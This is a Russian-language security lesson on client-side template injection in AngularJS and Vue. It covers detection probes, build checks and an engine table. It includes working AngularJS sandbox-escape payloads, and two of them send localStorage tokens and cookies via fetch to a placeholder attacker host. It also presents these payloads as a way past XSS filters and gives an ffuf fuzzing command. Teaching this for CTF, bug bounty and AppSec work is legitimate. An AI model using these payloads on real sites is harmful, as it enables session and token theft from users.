## Вопрос, с которого всё начинается

На уроке про SSTI мы заставляли **серверный** шаблонизатор исполнять наш текст. Но шаблоны компилируются и в **браузере** — так работают AngularJS, Vue, Knockout. Если твой ввод попадает в такой шаблон, он тоже исполняется как выражение.

Вопрос: как отличить клиентский шаблон от серверного и как из `{{...}}` получить XSS? Разберём это на одном примере — SPA-приложении с поиском.

## Наш пример

Есть приложение `crm.example` на AngularJS. Отправим в поиск обычный текст, а потом математическое выражение:

```bash
$ curl -s 'https://crm.example/?q=hello' | grep -o 'hello'
hello
$ curl -s 'https://crm.example/?q=%7B%7B7*7%7D%7D' | grep -o '49'
49
```

`%7B%7B7*7%7D%7D` — это `{{7*7}}`. Сервер вернул его как есть, но в браузере на месте поиска появилось `49`. Значит, выражение **вычислил браузер** — сработал клиентский шаблонизатор. Это **CSTI** (Client-Side Template Injection).

## Шаг 1: клиентский шаблон или серверный?

Отличить помогает тот же трюк с умножением строки:

```bash
$ curl -s 'https://crm.example/?q=%7B%7B7*%277%27%7D%7D' | grep -o '7777777'
7777777
```

`7777777` — это поведение **JavaScript**: строка `'7'` повторяется 7 раз. Jinja2 (Python) тоже дал бы `7777777`, но Jinja2 исполнился бы **на сервере** — то есть `49` был бы уже в ответе `curl`. У нас же в ответе `{{7*7}}` не вычислено, а в браузере — вычислено. Вывод: шаблон компилируется **на клиенте**.

Проверим, что на странице действительно AngularJS:

```bash
$ curl -s https://crm.example/ | grep -oiE 'angular[^"]*\.js|ng-app|ng-controller'
angular.min.js
ng-app
```

`ng-app` — директива, которая включает компиляцию AngularJS на участке DOM. Всё, что внутри, Angular «компилирует»: `{{ }}` становятся выражениями.

## Шаг 2: почему это XSS, а не «просто математика»

Раз браузер исполняет наше выражение, мы можем заставить его выполнить **произвольный JavaScript**. У AngularJS есть «песочница» — механизм, запрещающий выражению доступ к `window` и `constructor`. Но из песочницы есть классические побеги:

```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
```

Идея: `constructor` любого объекта — это функция `Function`, а `Function('alert(1)')` создаёт новый код в **глобальном** контексте, вне песочницы. Проверим:

```bash
$ curl -s 'https://crm.example/?q=%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D'
```

Открыв ссылку в браузере, увидим `alert` с доменом. Песочница обойдена, получен XSS. Дальше — кража cookie или токена:

```
{{constructor.constructor('fetch("//ATTACKER/?t="+localStorage.token)')()}}
```

Доказательство — приход токена на наш сервер.

## Шаг 3: почему фильтры это пропускают

CSTI часто проходит там, где обычный XSS заблокирован. Причина: фильтры ищут `<script>`, `onerror`, `javascript:` — характерные для XSS паттерны. Наш payload — это просто `{{ }}` и буквы, никаких тегов. Он выглядит как безобидный текст:

```
{{constructor.constructor('fetch("//attacker/?c="+document.cookie)')()}}
```

Ни `<script>`, ни `onerror` — WAF молчит. Более того, AngularJS требует `unsafe-eval` для компиляции выражений, поэтому сайты с AngularJS часто **сами** разрешают `eval` в CSP — и XSS проходит даже при строгой `script-src`.

## Шаг 4: Vue — компилятор в runtime

Vue ведёт себя похоже, но с важной оговоркой. Есть две сборки: `vue.js` (с компилятором шаблонов) и `vue.runtime.js` (без него). CSTI возможна только в первой — той, что компилирует шаблон **во время выполнения**:

```js
new Vue({ el: '#app', template: '<div>' + userInput + '</div>' });
```

Проверить, какая сборка подключена, можно в консоли браузера:

```js
typeof Vue.compile;   // "function" => runtime-компилятор доступен => CSTI возможна
```

Если `Vue.compile` — `undefined` (сборка `vue.runtime.js`), шаблоны компилируются только на этапе сборки, и ввод как шаблон не исполняется. Тогда CSTI как класс не работает.

## Шаг 5: карта движков

| Движок | Синтаксис | Уязвим | Детект |
|--------|-----------|--------|--------|
| AngularJS 1.x | `{{ }}` | < 1.6 (sandbox escapes) | `{{7*7}}` → `49` |
| Vue 2 (runtime) | `{{ }}` | компилятор в runtime | `{{7*7}}` → `49` |
| Vue 3 | `{{ }}` | компилятор не в runtime | обычно нет |
| Handlebars (client) | `{{ }}` | если `compile` доступен | `{{7*7}}` |
| Knockout | `data-bind` | если eval | `data-bind="..."` |
| Polymer | `[[ ]]` | если eval | `[[7*7]]` |

Ключ: CSTI возможен только там, где шаблон **компилируется во время выполнения** из пользовательского ввода. React (JSX), Vue 3, Angular 2+ с AOT-компиляцией — этот класс почти не встречается.

## Шаг 6: алгоритм детекта

```text
# шаг 1: базовый детект разными синтаксисами
{{7*7}}   ${7*7}   #{7*7}   [[7*7]]   <%= 7*7 %>

# шаг 2: различаем движок
{{7*'7'}}   # 7777777 -> JS (AngularJS/Vue) ; 49 -> Jinja2/Twig (сервер)
```

```bash
# массовый прогон по параметрам
$ ffuf -u 'https://crm.example/page?FUZZ=%7B%7B7*7%7D%7D' -w params.txt -mr '49'
```

Важно смотреть результат **в браузере**, а не только в ответе `curl`: клиентский шаблон исполнится уже после загрузки страницы.

## Шаг 7: SSR + hydration

Не забывай про серверный рендеринг: если приложение отдаёт шаблон, который затем компилируется на клиенте (SSR + hydration), точка инъекции может быть на сервере, а исполнение — в браузере. Проверяй оба слоя: «серверная» экранизация может оказаться недостаточной, если клиент всё равно строит шаблон из пришедшей строки.

## Шаг 8: где искать CSTI

Проверяй там, где пользовательский ввод попадает в шаблон, компилируемый браузером: legacy-AngularJS-приложения, Vue 2 в сборке с компилятором, клиентский Handlebars, старые Ember. Признаки в JS-бандле: `ng-app`, `angular.min.js`, `vue.js` (без `.runtime`), вызовы `Handlebars.compile`, `new Function` с пользовательской строкой. Если приложение собрано с AOT/precompiled-шаблонами (React, Vue 3, Angular 2+), этот класс почти не встречается — не трать на него время. Первый шаг всегда один: посмотреть, какие библиотеки и в какой сборке подключены, и только потом гнать математический детект.

## Что мы теперь знаем

- CSTI — исполнение нашего ввода **клиентским** шаблонизатором.
- Отличается от SSTI тем, что компилируется в браузере, а не на сервере.
- `{{7*'7'}}` → `7777777` указывает на JS-движок (AngularJS/Vue).
- AngularJS-песочница обходится через `constructor.constructor`.
- CSTI обходит XSS-фильтры: нет `<script>`/`onerror`.
- Vue уязвим только в сборке с runtime-компилятором (`vue.js`, не `vue.runtime.js`).
- Артефакт — `alert`/callback с украденным токеном.

## На что смотреть дальше

- **Смотри JS-бандлы** — какие библиотеки и в какой сборке подключены; от этого зависит, есть ли CSTI.
- **Не путай CSTI и SSTI** — различие видно по `{{7*'7'}}` и по тому, где вычисляется выражение.
- **Не ищи только `<script>`** — CSTI фильтры пропускают.
- **Песочница есть — не сдавайся:** она исторически обходится.
- **Vue 3 / React / AOT** — CSTI как класс не работает; не трать время.
- **Проверяй в браузере**, а не только curl'ом — клиентский шаблон исполняется после загрузки.

## Куда дальше

Дальше мы разберём **prototype pollution** — загрязнение прототипа объектов в JavaScript (`web-prototype-pollution`), которое часто ведёт к XSS и даже к RCE. А пока главное запомни: если `{{7*7}}` вычислилось **в браузере** — у тебя CSTI, то есть XSS в обход обычных фильтров.

## Где пригодится

- **CTF (Web):** задачи со `{{ }}` в параметрах и «странным» рендерингом — почти всегда CSTI/SSTI.
- **Bug bounty:** старые AngularJS-приложения и Vue-runtime — реальные цели.
- **Пентест:** анализ SPA и легаси-фронтендов; поиск компиляции пользовательского ввода.
- **Работа (AppSec/Dev):** понимание, почему `innerHTML`+AngularJS-контекст опасен; запрет runtime-компиляции недоверенных шаблонов.
